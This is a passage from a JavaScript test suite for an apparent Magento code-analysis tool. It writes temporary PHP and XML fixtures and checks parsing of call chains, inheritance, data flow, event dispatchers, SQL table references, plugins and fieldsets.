    depCalls.push({ property: dc[1], method: dc[2] });
  }
  assert(depCalls.some(c => c.property === 'validator' && c.method === 'validate'),
    'traceCallChain: detects $this->validator->validate()');

  // Event dispatch detection
  const dispatchRegex = /(?:eventManager|_eventManager)->dispatch\s*\(\s*['"]([^'"]+)['"]/g;
  const dispatches = [];
  let dm;
  while ((dm = dispatchRegex.exec(methodBody)) !== null) dispatches.push(dm[1]);
  assertEq(dispatches.length, 1, 'traceCallChain: detects 1 event dispatch');
  assertEq(dispatches[0], 'order_process_before', 'traceCallChain: correct event name');

  // Event→observer mapping
  const root = tmpDir;
  const eventFiles = await globFn('**/etc/**/events.xml', { cwd: root, absolute: true, nodir: true });
  const eventObserverMap = new Map();
  for (const evFile of eventFiles) {
    const evContent = readFn(evFile, 'utf-8');
    const eventRegex = /<event\s+name="([^"]+)"[^>]*>([\s\S]*?)<\/event>/g;
    let em;
    while ((em = eventRegex.exec(evContent)) !== null) {
      const obsRegex = /<observer\s+[^>]*name="([^"]+)"[^>]*instance="([^"]+)"[^>]*/g;
      let om;
      while ((om = obsRegex.exec(em[2])) !== null) {
        if (!eventObserverMap.has(em[1])) eventObserverMap.set(em[1], []);
        eventObserverMap.get(em[1]).push({ name: om[1], class: om[2] });
      }
    }
  }
  const observers = eventObserverMap.get('order_process_before') || [];
  assertEq(observers.length, 1, 'traceCallChain: maps event to 1 observer');
  assertEq(observers[0].class, 'Acme\\Foo\\Observer\\OrderObserver', 'traceCallChain: correct observer class');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Trace Call Chain Inheritance Tests ────────────────────────

async function testTraceCallChainInheritance() {
  console.log('\n── Trace Call Chain Inheritance ──');

  const tmpDir = path.join(__dirname, '__fixtures_trace_inherit');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Rule/Condition'), { recursive: true });

  // Parent abstract class with the validate method
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Rule/AbstractCondition.php'),
    `<?php
namespace Acme\\Foo\\Model\\Rule;
abstract class AbstractCondition {
    public function validate($model) {
        $this->prepareData($model);
        return $this->checkCondition($model);
    }
    abstract protected function prepareData($model);
    abstract protected function checkCondition($model);
}
`);

  // Child class that does NOT override validate - method is inherited
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Rule/Condition/Subtotal.php'),
    `<?php
namespace Acme\\Foo\\Model\\Rule\\Condition;
use Acme\\Foo\\Model\\Rule\\AbstractCondition;
class Subtotal extends AbstractCondition {
    private $totalsCollector;
    public function __construct(
        \\Acme\\Foo\\Model\\TotalsCollectorInterface $totalsCollector
    ) {
        $this->totalsCollector = $totalsCollector;
    }
    protected function prepareData($model) {
        $this->totalsCollector->collect($model);
    }
    protected function checkCondition($model) {
        return $model->getSubtotal() > 0;
    }
}
`);

  const { readFileSync: readFn } = await import('fs');

  // Inline version of resolveParentFromContent for unit testing
  function resolveParentFromContent(content) {
    const extendsMatch = content.match(/class\s+\w+\s+extends\s+([\w\\\\]+)/);
    if (!extendsMatch) return null;
    const parent = extendsMatch[1];
    if (!parent.includes('\\')) {
      const useMatch = content.match(new RegExp('use\\s+([\\w\\\\]+\\\\' + parent + ')\\s*;'));
      if (useMatch) return useMatch[1];
      const nsMatch = content.match(/namespace\s+([\w\\\\]+)/);
      if (nsMatch) return nsMatch[1] + '\\' + parent;
      return parent;
    }
    return parent.replace(/^\\/, '');
  }

  // Test 1: Child class resolves parent via use statement
  const childContent = readFn(path.join(tmpDir, 'vendor/acme/module-foo/Model/Rule/Condition/Subtotal.php'), 'utf-8');
  const parentFqcn = resolveParentFromContent(childContent);
  assertEq(parentFqcn, 'Acme\\Foo\\Model\\Rule\\AbstractCondition',
    'traceCallChainInherit: resolves parent FQCN from use statement');

  // Test 2: Abstract parent class has no parent
  const parentContent = readFn(path.join(tmpDir, 'vendor/acme/module-foo/Model/Rule/AbstractCondition.php'), 'utf-8');
  const grandparent = resolveParentFromContent(parentContent);
  assertEq(grandparent, null,
    'traceCallChainInherit: abstract class with no extends returns null');

  // Test 3: validate method not found in child, found in parent
  const methodRegex = /function\s+validate\s*\([^)]*\)[^{]*\{/;
  const childMethodStart = childContent.search(methodRegex);
  assertEq(childMethodStart, -1,
    'traceCallChainInherit: validate not found in child class');

  const parentMethodStart = parentContent.search(methodRegex);
  assert(parentMethodStart > -1,
    'traceCallChainInherit: validate found in parent class');

  // Test 4: Method body extraction from parent works
  let braceCount = 0;
  let bodyStart = parentContent.indexOf('{', parentMethodStart);
  let bodyEnd = bodyStart;
  for (let i = bodyStart; i < parentContent.length; i++) {
    if (parentContent[i] === '{') braceCount++;
    if (parentContent[i] === '}') braceCount--;
    if (braceCount === 0) { bodyEnd = i; break; }
  }
  const methodBody = parentContent.slice(bodyStart, bodyEnd + 1);
  assert(methodBody.includes('prepareData'), 'traceCallChainInherit: parent method body contains prepareData call');
  assert(methodBody.includes('checkCondition'), 'traceCallChainInherit: parent method body contains checkCondition call');

  // Test 5: Self-calls in inherited method are detected
  const selfCallRegex = /\$this->(\w+)\s*\(/g;
  const selfCalls = [];
  let sc;
  while ((sc = selfCallRegex.exec(methodBody)) !== null) {
    if (sc[1] !== 'validate' && sc[1] !== '__construct') selfCalls.push(sc[1]);
  }
  assert(selfCalls.includes('prepareData'), 'traceCallChainInherit: detects prepareData in inherited method');
  assert(selfCalls.includes('checkCondition'), 'traceCallChainInherit: detects checkCondition in inherited method');

  // Test 6: Fully qualified parent name resolution
  const fqContent = '<?php\nnamespace Acme\\Bar;\nclass Child extends \\Acme\\Foo\\Model\\Rule\\AbstractCondition {\n}';
  const fqParent = resolveParentFromContent(fqContent);
  assertEq(fqParent, 'Acme\\Foo\\Model\\Rule\\AbstractCondition',
    'traceCallChainInherit: resolves fully qualified parent name');

  // Test 7: Namespace-relative parent resolution (no use statement)
  const nsRelContent = '<?php\nnamespace Acme\\Foo\\Model\\Rule\\Condition;\nclass Custom extends ParentClass {\n}';
  const nsRelParent = resolveParentFromContent(nsRelContent);
  assertEq(nsRelParent, 'Acme\\Foo\\Model\\Rule\\Condition\\ParentClass',
    'traceCallChainInherit: resolves namespace-relative parent');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Trace Data Flow Tests ─────────────────────────────────────

async function testTraceDataFlow() {
  console.log('\n── Trace Data Flow ──');

  const tmpDir = path.join(__dirname, '__fixtures_dataflow');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Quote/Address/Total'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Plugin'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/etc'), { recursive: true });

  // File that SETS the attribute via magic setter
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Quote/Address/Total/DiscountCollector.php'),
    `<?php
namespace Acme\\Foo\\Model\\Quote\\Address\\Total;
class DiscountCollector {
    public const CODE = 'custom_discounted_price_incl_tax';
    public function collect($quote, $shippingAssignment, $total) {
        $total->setCustomDiscountedPriceInclTax(100.50);
        $total->setBaseCustomDiscountedPriceInclTax(100.50);
    }
}
`);

  // File that GETS the attribute via magic getter
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Plugin/TotalsPlugin.php'),
    `<?php
namespace Acme\\Foo\\Plugin;
class TotalsPlugin {
    public function afterCollect($subject, $result, $quote) {
        foreach ($quote->getAllAddresses() as $address) {
            $value = $address->getCustomDiscountedPriceInclTax();
        }
        return $result;
    }
}
`);

  // File using setData pattern
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/Observer.php'),
    `<?php
namespace Acme\\Foo\\Model;
class Observer {
    public function execute($observer) {
        $address = $observer->getData('address');
        $address->setData('custom_discounted_price_incl_tax', 42.0);
    }
}
`);

  // XML reference
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/etc/sales.xml'),
    `<?xml version="1.0"?>
<config>
  <section name="quote">
    <group name="totals">
      <item name="custom_discounted_price_incl_tax" instance="Acme\\Foo\\Model\\Quote\\Address\\Total\\DiscountCollector" sort_order="450"/>
    </group>
  </section>
</config>`);

  const { glob: globFn } = await import('glob');
  const { readFileSync: readFn } = await import('fs');
  const root = tmpDir;
  const attributeKey = 'custom_discounted_price_incl_tax';
  const pascal = attributeKey.split('_').map(p => p.charAt(0).toUpperCase() + p.slice(1)).join('');
  const setterMethod = `set${pascal}`;
  const getterMethod = `get${pascal}`;

  // Test PascalCase conversion
  assertEq(setterMethod, 'setCustomDiscountedPriceInclTax', 'traceDataFlow: PascalCase setter');
  assertEq(getterMethod, 'getCustomDiscountedPriceInclTax', 'traceDataFlow: PascalCase getter');

  // Test setter detection
  const phpFiles = await globFn('**/*.php', { cwd: root, absolute: true, nodir: true });
  let setterCount = 0;
  let getterCount = 0;
  let constCount = 0;
  const setterRegex = new RegExp(
    `(?:->|::)${setterMethod}\\s*\\(|setData\\s*\\(\\s*['"]${attributeKey}['"]`
  );
  const getterRegex = new RegExp(
    `(?:->|::)${getterMethod}\\s*\\(`
  );
  const constRegex = new RegExp(
    `const\\s+\\w+\\s*=\\s*['"]${attributeKey}['"]`
  );

  for (const phpFile of phpFiles) {
    const content = readFn(phpFile, 'utf-8');
    if (setterRegex.test(content)) setterCount++;
    if (getterRegex.test(content)) getterCount++;
    if (constRegex.test(content)) constCount++;
  }

  assertEq(setterCount, 2, 'traceDataFlow: finds 2 setter files (magic + setData)');
  assertEq(getterCount, 1, 'traceDataFlow: finds 1 getter file');
  assertEq(constCount, 1, 'traceDataFlow: finds 1 constant definition');

  // Test XML reference detection
  const xmlFiles = await globFn('**/etc/**/*.xml', { cwd: root, absolute: true, nodir: true });
  let xmlRefCount = 0;
  for (const xmlFile of xmlFiles) {
    const content = readFn(xmlFile, 'utf-8');
    if (content.includes(attributeKey)) xmlRefCount++;
  }
  assertEq(xmlRefCount, 1, 'traceDataFlow: finds 1 XML reference');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Find Event Dispatchers Tests ──────────────────────────────

async function testFindEventDispatchers() {
  console.log('\n── Find Event Dispatchers ──');

  const tmpDir = path.join(__dirname, '__fixtures_dispatchers');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/Model'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-bar/Observer'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-foo/etc'), { recursive: true });

  // File that dispatches the event
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/Model/OrderService.php'),
    `<?php
namespace Acme\\Foo\\Model;
class OrderService {
    private $eventManager;
    public function __construct($eventManager) {
        $this->eventManager = $eventManager;
    }
    public function placeOrder($order) {
        $this->eventManager->dispatch('sales_order_place_after', ['order' => $order]);
    }
}
`);

  // Another file that dispatches the same event
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-bar/Observer/ReorderProcessor.php'),
    `<?php
namespace Acme\\Bar\\Observer;
class ReorderProcessor {
    private $eventManager;
    public function execute($observer) {
        $order = $observer->getData('order');
        $this->eventManager->dispatch('sales_order_place_after', ['order' => $order]);
    }
}
`);

  // Events.xml with observer
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-foo/etc/events.xml'),
    `<?xml version="1.0"?>
<config>
  <event name="sales_order_place_after">
    <observer name="order_email" instance="Acme\\Foo\\Observer\\SendEmail"/>
    <observer name="order_index" instance="Acme\\Foo\\Observer\\IndexOrder"/>
  </event>
</config>`);

  const { glob: globFn } = await import('glob');
  const { readFileSync: readFn } = await import('fs');
  const root = tmpDir;
  const eventName = 'sales_order_place_after';
  const escaped = eventName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const dispatchRegex = new RegExp(`dispatch\\s*\\(\\s*['"]${escaped}['"]`);

  // Test dispatcher detection
  const phpFiles = await globFn('**/*.php', { cwd: root, absolute: true, nodir: true });
  const dispatchers = [];
  for (const phpFile of phpFiles) {
    const content = readFn(phpFile, 'utf-8');
    if (!content.includes(eventName)) continue;
    const lines = content.split('\n');
    for (let i = 0; i < lines.length; i++) {
      if (dispatchRegex.test(lines[i])) {
        let methodName = null;
        for (let j = i; j >= Math.max(0, i - 30); j--) {
          const mMatch = lines[j].match(/(?:public|protected|private|static)\s+function\s+(\w+)/);
          if (mMatch) { methodName = mMatch[1]; break; }
        }
        const classMatch = content.match(/class\s+(\w+)/);
        dispatchers.push({
          class: classMatch?.[1],
          method: methodName,
          line: i + 1
        });
      }
    }
  }

  assertEq(dispatchers.length, 2, 'findEventDispatchers: finds 2 dispatch locations');
  assert(dispatchers.some(d => d.class === 'OrderService' && d.method === 'placeOrder'),
    'findEventDispatchers: OrderService::placeOrder dispatches');
  assert(dispatchers.some(d => d.class === 'ReorderProcessor' && d.method === 'execute'),
    'findEventDispatchers: ReorderProcessor::execute dispatches');

  // Test observer counting from events.xml
  const eventsFiles = await globFn('**/etc/**/events.xml', { cwd: root, absolute: true, nodir: true });
  let observerCount = 0;
  for (const file of eventsFiles) {
    const content = readFn(file, 'utf-8');
    if (!content.includes(eventName)) continue;
    const eventBlockRegex = new RegExp(`<event\\s+name="${escaped}"[^>]*>([\\s\\S]*?)<\\/event>`, 'g');
    let em;
    while ((em = eventBlockRegex.exec(content)) !== null) {
      const obsMatches = em[1].match(/<observer\s+/g);
      if (obsMatches) observerCount += obsMatches.length;
    }
  }
  assertEq(observerCount, 2, 'findEventDispatchers: counts 2 registered observers');

  // Test non-existent event
  const nonExistentRegex = /dispatch\s*\(\s*['"]non_existent_event_xyz['"]/;
  let foundNonExistent = false;
  for (const phpFile of phpFiles) {
    const content = readFn(phpFile, 'utf-8');
    if (nonExistentRegex.test(content)) { foundNonExistent = true; break; }
  }
  assert(!foundNonExistent, 'findEventDispatchers: no false positives for non-existent event');

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

// ─── Module Filter Array Support Tests ─────────────────────────

function testModuleFilterArray() {
  console.log('\n── Module Filter Array Support ──');

  // Re-implement filterByModule logic inline for testing
  function filterByModule(results, moduleFilter) {
    if (!moduleFilter) return results;
    const patterns = Array.isArray(moduleFilter) ? moduleFilter : [moduleFilter];
    return results.filter(r => {
      const mod = r.module || '';
      return patterns.some(pat => {
        if (pat.includes('*')) {
          const normalized = pat.replace(/[/_]/g, '[/_]');
          const regex = new RegExp('^' + normalized.replace(/\*/g, '.*') + '$', 'i');
          return regex.test(mod);
        }
        // Exact match with separator normalization
        const normalizedPat = pat.replace(/[/_]/g, '_').toLowerCase();
        const normalizedMod = mod.replace(/[/_]/g, '_').toLowerCase();
        return normalizedMod === normalizedPat || normalizedMod.startsWith(normalizedPat);
      });
    });
  }

  const results = [
    { module: 'acme_paymentgateway', path: 'vendor/acme/paymentgateway/Model/Foo.php' },
    { module: 'acme_module-free-shipping', path: 'vendor/acme/module-free-shipping/Model/Bar.php' },
    { module: 'magento_module-sales-rule', path: 'vendor/magento/module-sales-rule/Model/Baz.php' },
    { module: 'acme_module-quote', path: 'vendor/acme/module-quote/Plugin/Qux.php' },
  ];

  // Single string filter
  const single = filterByModule(results, 'acme_paymentgateway');
  assertEq(single.length, 1, 'moduleFilter: single string matches 1 result');

  // Array filter with multiple modules
  const multi = filterByModule(results, ['acme_paymentgateway', 'acme_module-free-shipping']);
  assertEq(multi.length, 2, 'moduleFilter: array matches 2 results');

  // Wildcard with array
  const wildcard = filterByModule(results, ['acme_*']);
  assertEq(wildcard.length, 3, 'moduleFilter: wildcard acme_* matches 3 acme modules');

  // Mixed array: wildcard + specific
  const mixed = filterByModule(results, ['magento_module-sales-rule', 'acme_module-quote']);
  assertEq(mixed.length, 2, 'moduleFilter: mixed exact array matches 2 results');

  // Empty array returns nothing (no patterns to match)
  const empty = filterByModule(results, []);
  assertEq(empty.length, 0, 'moduleFilter: empty array returns no results (no patterns)');

  // null/undefined returns all results (no filtering)
  const noFilter = filterByModule(results, null);
  assertEq(noFilter.length, 4, 'moduleFilter: null returns all results');
}

// ─── New MCP Tool Definition Tests ────────────────────────────

function testNewMcpToolDefinitions() {
  console.log('\n── New MCP Tool Definitions ──');

  // Simulate the tool definitions array to verify schema
  const toolDefs = [
    {
      name: 'magento_find_trigger',
      inputSchema: {
        type: 'object',
        properties: {
          triggerName: { type: 'string' },
          tableName: { type: 'string' }
        }
      }
    },
    {
      name: 'magento_find_table_usage',
      inputSchema: {
        type: 'object',
        properties: {
          tableName: { type: 'string' }
        },
        required: ['tableName']
      }
    },
    {
      name: 'magento_find_db_schema',
      inputSchema: {
        type: 'object',
        properties: {
          tableName: { type: 'string' }
        },
        required: ['tableName']
      }
    }
  ];

  // magento_find_trigger has optional parameters
  const triggerTool = toolDefs.find(t => t.name === 'magento_find_trigger');
  assert(triggerTool != null, 'magento_find_trigger tool definition exists');
  assert(!triggerTool.inputSchema.required, 'magento_find_trigger has no required params (all optional)');
  assert('triggerName' in triggerTool.inputSchema.properties, 'magento_find_trigger has triggerName param');
  assert('tableName' in triggerTool.inputSchema.properties, 'magento_find_trigger has tableName param');

  // magento_find_table_usage requires tableName
  const tableUsageTool = toolDefs.find(t => t.name === 'magento_find_table_usage');
  assert(tableUsageTool != null, 'magento_find_table_usage tool definition exists');
  assert(tableUsageTool.inputSchema.required.includes('tableName'), 'magento_find_table_usage requires tableName');

  // magento_find_db_schema still requires tableName
  const dbSchemaTool = toolDefs.find(t => t.name === 'magento_find_db_schema');
  assert(dbSchemaTool != null, 'magento_find_db_schema tool definition exists');
  assert(dbSchemaTool.inputSchema.required.includes('tableName'), 'magento_find_db_schema requires tableName');
}

// ─── Setup Script Detection Tests ─────────────────────────────

function testSetupScriptDetection() {
  console.log('\n── Setup Script Detection ──');

  // Test that Setup script paths are correctly identified
  function isSetupScript(path) {
    return path.includes('/Setup/') || path.includes('InstallSchema') ||
           path.includes('UpgradeSchema') || path.includes('InstallData') ||
           path.includes('UpgradeData') || path.includes('/Patch/');
  }

  assert(isSetupScript('vendor/acme/module-foo/Setup/UpgradeSchema.php'), 'UpgradeSchema.php is a setup script');
  assert(isSetupScript('vendor/acme/module-foo/Setup/InstallSchema.php'), 'InstallSchema.php is a setup script');
  assert(isSetupScript('vendor/acme/module-foo/Setup/Patch/Schema/AddColumn.php'), 'Schema patch is a setup script');
  assert(isSetupScript('app/code/Acme/Foo/Setup/UpgradeData.php'), 'UpgradeData.php is a setup script');
  assert(!isSetupScript('vendor/acme/module-foo/Model/Product.php'), 'Model file is NOT a setup script');
  assert(!isSetupScript('vendor/acme/module-foo/etc/db_schema.xml'), 'db_schema.xml is NOT a setup script');

  // Test trigger detection regex patterns
  function containsTriggerSignals(content) {
    return content.includes('TriggerFactory') ||
           content.includes('createTrigger') ||
           content.includes('dropTrigger');
  }

  assert(
    containsTriggerSignals('$this->triggerFactory->create(); $setup->getConnection()->createTrigger($t);'),
    'Detects createTrigger in PHP code'
  );
  assert(
    containsTriggerSignals('use Magento\\Framework\\DB\\Ddl\\TriggerFactory;'),
    'Detects TriggerFactory import'
  );
  assert(
    !containsTriggerSignals('$this->factory->create(); $rule->save();'),
    'Does NOT detect triggers in normal factory usage'
  );
}

// ─── SQL Table Reference Detection Tests ──────────────────────

function testSqlTableReferenceDetection() {
  console.log('\n── SQL Table Reference Detection ──');

  // Simulate SQL table reference extraction (mirrors Rust SqlReferenceAnalyzer logic)
  function extractTableRefs(content) {
    const tables = new Set();
    const sqlKeywords = new Set([
      'as', 'set', 'where', 'and', 'or', 'not', 'null', 'true', 'false',
      'select', 'insert', 'update', 'delete', 'from', 'into', 'values',
      'group', 'order', 'having', 'limit', 'offset', 'on', 'inner', 'left',
      'right', 'outer', 'cross', 'join', 'if', 'then', 'else', 'end',
      'when', 'case', 'new', 'old', 'main_table', 'related',
    ]);

    // Extract from Zend_Db_Expr
    const exprRe = /Zend_Db_Expr\s*\(\s*'([^']*(?:\n[^']*)*)'/g;
    const tableRe = /\b(?:from|into|update|join|table)\s+`?(\w+)`?/gi;
    let match;

    while ((match = exprRe.exec(content)) !== null) {
      const sql = match[1];
      let tMatch;
      while ((tMatch = tableRe.exec(sql)) !== null) {
        const tbl = tMatch[1].toLowerCase();
        if (!sqlKeywords.has(tbl)) tables.add(tbl);
      }
    }

    // Extract from getTable('name')
    const getTableRe = /getTable(?:Name)?\s*\(\s*['"](\w+)['"]/g;
    while ((match = getTableRe.exec(content)) !== null) {
      tables.add(match[1].toLowerCase());
    }

    return Array.from(tables);
  }

  // Test Zend_Db_Expr extraction
  const exprContent = "new \\Zend_Db_Expr('(SELECT row_id, SUM(delta) FROM ordered_delta GROUP BY row_id)')";
  const exprTables = extractTableRefs(exprContent);
  assert(exprTables.includes('ordered_delta'), 'Extracts table from Zend_Db_Expr');

  // Test getTable extraction
  const getTableContent = "$conn->getTable('sales_order'); $conn->getTableName('quote_item');";
  const getTables = extractTableRefs(getTableContent);
  assert(getTables.includes('sales_order'), 'Extracts table from getTable()');
  assert(getTables.includes('quote_item'), 'Extracts table from getTableName()');

  // Test no false positives
  const noSqlContent = "$this->logger->info('Processing'); $repo->getById(1);";
  const noTables = extractTableRefs(noSqlContent);
  assertEq(noTables.length, 0, 'No false positives from non-SQL code');

  // Test combined scenario (real-world pattern)
  const realContent = [
    "$select->joinLeft(",
    "  ['delta' => new \\Zend_Db_Expr('(SELECT row_id FROM custom_delta GROUP BY row_id)')],",
    "  'main.row_id = delta.row_id'",
    ");",
    "$orderedTable = $connection->getTable('custom_ordered');"
  ].join('\n');
  const realTables = extractTableRefs(realContent);
  assert(realTables.includes('custom_delta'), 'Real-world: extracts from Zend_Db_Expr');
  assert(realTables.includes('custom_ordered'), 'Real-world: extracts from getTable');

  // Test categorization logic
  function categorizeResult(path) {
    if (path.includes('db_schema.xml')) return 'declarative';
    if (path.includes('/Setup/') || path.includes('UpgradeSchema')) return 'setup';
    if (path.endsWith('.php')) return 'php';
    if (path.endsWith('.xml')) return 'xml';
    return 'other';
  }

  assertEq(categorizeResult('vendor/acme/module/etc/db_schema.xml'), 'declarative', 'Categorize: db_schema.xml -> declarative');
  assertEq(categorizeResult('vendor/acme/module/Setup/UpgradeSchema.php'), 'setup', 'Categorize: UpgradeSchema.php -> setup');
  assertEq(categorizeResult('vendor/acme/module/Observer/OrderPlaced.php'), 'php', 'Categorize: Observer PHP -> php');
  assertEq(categorizeResult('vendor/acme/module/etc/di.xml'), 'xml', 'Categorize: di.xml -> xml');
}

// ─── extractPluginMethods Tests ───────────────────────────────

async function testExtractPluginMethods() {
  console.log('\n── extractPluginMethods ──');

  const tmpDir = path.join(__dirname, 'tmp_plugin_test');
  mkdirSync(tmpDir, { recursive: true });
  const pluginFile = path.join(tmpDir, 'TestPlugin.php');
  writeFileSync(pluginFile, [
    '<?php',
    'namespace Test\\Module\\Plugin;',
    '',
    'class TestPlugin',
    '{',
    '    public function beforeSave($subject, $result)',
    '    {',
    '        return [$result];',
    '    }',
    '',
    '    public function afterGetPrice($subject, $result)',
    '    {',
    '        return $result * 1.1;',
    '    }',
    '',
    '    public function aroundExecute($subject, callable $proceed, ...$args)',
    '    {',
    '        return $proceed(...$args);',
    '    }',
    '',
    '    public function normalMethod()',
    '    {',
    '        // not a plugin method',
    '    }',
    '}'
  ].join('\n'));

  function extractPluginMethods(filePath) {
    let content;
    try { content = readFileSync(filePath, 'utf-8'); } catch { return []; }
    const methods = [];
    const methodRegex = /^\s*public\s+function\s+((?:before|after|around)([A-Z]\w*))\s*\(([^)]*)\)/gm;
    let match;
    while ((match = methodRegex.exec(content)) !== null) {
      const name = match[1];
      const targetMethod = match[2].charAt(0).toLowerCase() + match[2].slice(1);
      let type = 'around';
      if (name.startsWith('before')) type = 'before';
      else if (name.startsWith('after')) type = 'after';
      methods.push({ name, type, targetMethod, signature: match[0].trim() });
    }
    return methods;
  }

  const methods = extractPluginMethods(pluginFile);
  assertEq(methods.length, 3, 'extractPluginMethods: finds 3 plugin methods (not normalMethod)');
  assertEq(methods[0].name, 'beforeSave', 'first method: beforeSave');
  assertEq(methods[0].type, 'before', 'beforeSave type is before');
  assertEq(methods[0].targetMethod, 'save', 'beforeSave targets save');
  assertEq(methods[1].name, 'afterGetPrice', 'second method: afterGetPrice');
  assertEq(methods[1].type, 'after', 'afterGetPrice type is after');
  assertEq(methods[1].targetMethod, 'getPrice', 'afterGetPrice targets getPrice');
  assertEq(methods[2].name, 'aroundExecute', 'third method: aroundExecute');
  assertEq(methods[2].type, 'around', 'aroundExecute type is around');
  assertEq(methods[2].targetMethod, 'execute', 'aroundExecute targets execute');

  const empty = extractPluginMethods('/nonexistent/path.php');
  assertEq(empty.length, 0, 'non-existent file returns empty array');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── parseFieldsetXml Tests ──────────────────────────────────

async function testParseFieldsetXml() {
  console.log('\n── parseFieldsetXml ──');

  const tmpDir = path.join(__dirname, 'tmp_fieldset_test', 'vendor', 'test', 'module-sales', 'etc');
  mkdirSync(tmpDir, { recursive: true });
  const fieldsetFile = path.join(tmpDir, 'fieldset.xml');
  writeFileSync(fieldsetFile, [
    '<?xml version="1.0"?>',
    '<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">',
    '    <scope id="global">',
    '        <fieldset id="sales_copy_order">',
    '            <field name="customer_email">',
    '                <aspect name="to_edit" />',
    '                <aspect name="to_order" />',
    '            </field>',
    '            <field name="shipping_amount">',
    '                <aspect name="to_order" />',
    '            </field>',
    '        </fieldset>',
    '        <fieldset id="sales_convert_quote">',
    '            <field name="coupon_code">',
    '                <aspect name="to_order" />',
    '            </field>',
    '        </fieldset>',
    '    </scope>',
    '</config>'
  ].join('\n'));

  function parseFieldsetXmlSync(root, filterFieldset, filterAspect) {
    const results = [];
    const fsFiles = [fieldsetFile];
    for (const fsFile of fsFiles) {
      let content;
      try { content = readFileSync(fsFile, 'utf-8'); } catch { continue; }
      const relPath = fsFile.replace(root + '/', '');
      const scopeRegex = /<scope\s+id="([^"]+)">([\s\S]*?)<\/scope>/g;
      let scopeMatch;
      while ((scopeMatch = scopeRegex.exec(content)) !== null) {
        const scopeName = scopeMatch[1];
        const scopeBlock = scopeMatch[2];
        const innerFsRegex = /<fieldset\s+id="([^"]+)">([\s\S]*?)<\/fieldset>/g;
        let innerMatch;
        while ((innerMatch = innerFsRegex.exec(scopeBlock)) !== null) {
          const innerFieldsetId = innerMatch[1];
          if (filterFieldset && !innerFieldsetId.toLowerCase().includes(filterFieldset.toLowerCase()) && !scopeName.toLowerCase().includes(filterFieldset.toLowerCase())) continue;
          const innerBlock = innerMatch[2];
          const fieldRegex = /<field\s+name="([^"]+)">([\s\S]*?)<\/field>/g;
          let fieldMatch;
          const fields = [];
          while ((fieldMatch = fieldRegex.exec(innerBlock)) !== null) {
            const fieldName = fieldMatch[1];
            const fieldBlock = fieldMatch[2];
            const aspectRegex = /<aspect\s+name="([^"]+)"\s*(?:\/>|>[^<]*<\/aspect>)/g;
            let aspectMatch;
            while ((aspectMatch = aspectRegex.exec(fieldBlock)) !== null) {
              if (filterAspect && !aspectMatch[1].toLowerCase().includes(filterAspect.toLowerCase())) continue;
              fields.push({ field: fieldName, aspect: aspectMatch[1] });
            }
          }
          if (fields.length > 0) {
            results.push({ file: relPath, scope: scopeName, fieldset: innerFieldsetId, fields });
          }
        }
      }
    }
    return results;
  }

  const root = path.join(__dirname, 'tmp_fieldset_test');

  const all = parseFieldsetXmlSync(root, null, null);
  assertEq(all.length, 2, 'parseFieldsetXml: finds 2 fieldsets without filter');

  const orderOnly = parseFieldsetXmlSync(root, 'sales_copy_order', null);
  assertEq(orderOnly.length, 1, 'filter by sales_copy_order: 1 result');
  assertEq(orderOnly[0].fieldset, 'sales_copy_order', 'correct fieldset name');
  assertEq(orderOnly[0].fields.length, 3, 'sales_copy_order has 3 field+aspect pairs');

  const toEditOnly = parseFieldsetXmlSync(root, null, 'to_edit');
  assert(toEditOnly.length >= 1, 'filter by to_edit: at least 1 result');
  const editFields = toEditOnly[0].fields.filter(f => f.aspect === 'to_edit');
  assert(editFields.length > 0, 'to_edit aspect found in results');

  const noMatch = parseFieldsetXmlSync(root, 'nonexistent_fieldset', null);
  assertEq(noMatch.length, 0, 'nonexistent filter returns empty');

  rmSync(path.join(__dirname, 'tmp_fieldset_test'), { recursive: true, force: true });
}

// ─── readMethodSnippet Tests ──────────────────────────────────

function testReadMethodSnippet() {
  console.log('\n── readMethodSnippet ──');

  const tmpDir = path.join(__dirname, 'tmp_snippet_test');
  mkdirSync(tmpDir, { recursive: true });
  const phpFile = path.join(tmpDir, 'TestClass.php');
  writeFileSync(phpFile, [
    '<?php',
    'namespace Test\\Module;',
    '',
    'class TestClass',
    '{',
    '    public function execute()',
    '    {',
    '        $this->doSomething();',
    '        return $result;',
    '    }',
    '',
    '    public function save($entity)',
    '    {',
    '        return $this->repository->save($entity);',
    '    }',
    '}'
  ].join('\n'));

  function readMethodSnippet(filePath, methodName, maxLines = 15) {
    let content;
    try { content = readFileSync(filePath, 'utf-8'); } catch { return null; }
    const lines = content.split('\n');
    for (let i = 0; i < lines.length; i++) {
      if (lines[i].includes(`function ${methodName}(`)) {
        return lines.slice(i, i + maxLines).join('\n');
      }
    }
    return null;
  }

  const executeSnippet = readMethodSnippet(phpFile, 'execute');
  assert(executeSnippet !== null, 'readMethodSnippet: finds execute()');
  assert(executeSnippet.includes('function execute()'), 'snippet contains function signature');
  assert(executeSnippet.includes('doSomething'), 'snippet contains method body');

  const saveSnippet = readMethodSnippet(phpFile, 'save', 3);
  assert(saveSnippet !== null, 'readMethodSnippet: finds save()');
